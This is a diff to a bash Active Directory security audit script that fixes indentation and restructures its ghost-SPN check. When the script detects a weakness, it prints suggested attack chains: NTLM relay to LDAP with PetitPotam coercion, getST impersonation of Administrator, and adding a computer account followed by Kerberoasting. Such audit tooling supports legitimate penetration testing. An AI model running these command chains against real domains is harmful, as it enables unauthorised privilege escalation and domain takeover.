@@ -295,7 +295,7 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + Channel Binding → ldap_security_check.csv${NC}"
       echo -e "$VULN_DCS"
     fi
-     FIRST_VULN_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
+    FIRST_VULN_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
     echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_DC_IP} --remove-mic --delegate-access${NC}"
     echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_DC_IP}${NC}"
     echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
@@ -688,19 +688,22 @@ if [ ! -z "$GHOST_SPNS" ]; then
     fi
   done <<< "$GHOST_SPNS"
   
-  if [ "$GHOST_COUNT" -gt 0 ]; then
-    echo -e "${RED}[KO] $GHOST_COUNT Ghost SPN(s) found (potential SPN hijacking)${NC}"
-    echo -e "$GHOST_LIST"
-    if [ ! -z "$MAQ" ] && [ "$MAQ" -gt 0 ]; then
-      FIRST_GHOST=$(echo -e "$GHOST_LIST" | head -1 | grep -oP '(?<=TERMSRV/|HOST/|RestrictedKrbHost/|HTTP/)[^$]+' | head -1)
+if [ "$GHOST_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $GHOST_COUNT Ghost SPN(s) found (potential SPN hijacking)${NC}"
+  echo -e "$GHOST_LIST"
+  if [ ! -z "$MAQ" ] && [ "$MAQ" -gt 0 ]; then
+    FIRST_GHOST=$(echo -e "$GHOST_LIST" | head -1 | grep -oP '(?<=TERMSRV/|HOST/|RestrictedKrbHost/|HTTP/)[^$]+' | head -1)
     if [ ! -z "$FIRST_GHOST" ]; then
       GHOST_HOSTNAME=$(echo "$FIRST_GHOST" | cut -d'.' -f1)
       echo -e "${GREY}       └─ addcomputer.py -computer-name '${GHOST_HOSTNAME}\$' -computer-pass 'ComplexPass123!' '$DOMAIN'/'$USERNAME':'$PASSWORD'${NC}"
       echo -e "${GREY}       └─ GetUserSPNs.py '$DOMAIN'/'$USERNAME':'$PASSWORD' -request -dc-ip $DC_IP${NC}"
     fi
   else
-    echo -e "${GREEN}[OK] No Ghost SPNs found${NC}"
+    echo -e "${GREY}       └─ Not exploitable: MachineAccountQuota = 0${NC}"
   fi
+else
+  echo -e "${GREEN}[OK] No Ghost SPNs found${NC}"
+fi
 else
   echo -e "${GREY}[--] Could not enumerate SPNs${NC}"
 fi
